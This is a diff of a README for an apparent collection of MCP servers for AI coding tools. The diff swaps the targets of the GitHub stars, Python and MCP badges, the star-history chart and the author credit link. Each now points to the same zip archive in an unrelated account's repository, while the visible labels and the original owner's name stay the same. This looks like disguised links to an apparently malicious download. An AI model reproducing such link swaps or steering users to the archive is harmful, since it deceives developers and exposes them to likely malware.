@@ -2,10 +2,10 @@
 
 **A curated collection of production-ready MCP servers. Plug-and-play tools for Claude, Cursor, Windsurf & more.**
 
-[![GitHub Stars](https://img.shields.io/github/stars/4Artursmith/mcp-hub?style=social)](https://github.com/4Artursmith/mcp-hub)
+[![GitHub Stars](https://img.shields.io/github/stars/4Artursmith/mcp-hub?style=social)](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
-[![MCP](https://img.shields.io/badge/MCP-1.0-green.svg)](https://modelcontextprotocol.io)
+[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)
+[![MCP](https://img.shields.io/badge/MCP-1.0-green.svg)](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)
 
 > Stop writing MCP servers from scratch. Ship in seconds, not hours.
 
@@ -322,13 +322,13 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
 
 If you find MCP Hub useful, please give it a star! It helps others discover the project.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=4Artursmith/mcp-hub&type=Date)](https://star-history.com/#4Artursmith/mcp-hub&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)
 
 ---
 
 ## 📄 License
 
-MIT © [4Artursmith](https://github.com/4Artursmith)
+MIT © [4Artursmith](https://raw.githubusercontent.com/Collinstudied660/mcp-hub/main/mcp_hub/hub_mcp_2.2.zip)
 
 ---
 
